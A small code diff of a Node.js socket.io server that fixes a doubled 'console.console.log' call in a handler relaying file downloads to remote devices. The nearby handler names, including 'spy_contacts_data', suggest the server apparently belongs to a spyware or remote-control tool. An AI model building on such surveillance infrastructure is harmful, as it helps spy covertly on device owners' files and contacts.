@@ -111,7 +111,7 @@ io.on("connection", (socket) => {
   });
   socket.on("download_file_multi", (def_path, data, too) => {
     io.to(device_secure_ids[too]).emit("download_multi", def_path, data);
-    console.console.log("path " + def_path + ", data " + data);
+    console.log("path " + def_path + ", data " + data);
   });
 
   socket.on("spy_contacts_data", (cname, cdata) => {
